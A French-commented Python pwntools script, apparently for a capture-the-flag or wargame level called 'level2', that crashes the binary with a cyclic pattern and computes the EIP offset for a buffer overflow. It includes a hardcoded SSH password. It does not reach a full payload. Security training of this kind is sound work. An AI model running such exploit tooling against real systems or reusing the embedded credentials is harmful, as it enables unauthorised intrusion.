#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = True  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level2"  # Nom d'utilisateur SSH
PASSWORD = "53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77"  # Mot de passe SSH
SSH_SESSION = None

def print_binary_info():
    # Charger le binaire avec pwntools
    elf = ELF('./Resources/level2')

    print("\n=== Informations sur le binaire ===")
    print("\nFonctions disponibles:")
    for func in elf.functions:
        print(f"  - {func}: 0x{elf.functions[func].address:x}")

    print("\nSymboles PLT:")
    for plt in elf.plt:
        print(f"  - {plt}: 0x{elf.plt[plt]:x}")

    print("\nAdresses importantes:")
    print(f"  - Entry point: 0x{elf.entry:x}")
    print(f"  - Base address: 0x{elf.address:x}")

    return elf


def get_connection():
    if LOCAL:
        return process(['./Resources/level2'])
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        return shell.process(['/home/user/level2/level2'])


def exploit():
    # Afficher les informations du binaire en premier
    if LOCAL:
        elf = print_binary_info()

    # Établir la connexion
    conn = get_connection()

    # Créer un pattern plus long (100 octets)
    pattern = cyclic(100)

    # Envoyer le pattern
    conn.sendline(pattern)

    # Attendre que le programme crash
    conn.wait()

    # Si en local, on peut utiliser process pour obtenir le core dump
    if LOCAL:
        core = conn.corefile
        # Obtenir la valeur de EIP
        eip_value = core.eip
        print(f"\nValeur de EIP: 0x{eip_value:08x}")
        # Trouver l'offset dans le pattern
        eip_offset = cyclic_find(eip_value)
        print(f"Offset de EIP: {eip_offset} bytes")


if __name__ == "__main__":
    exploit()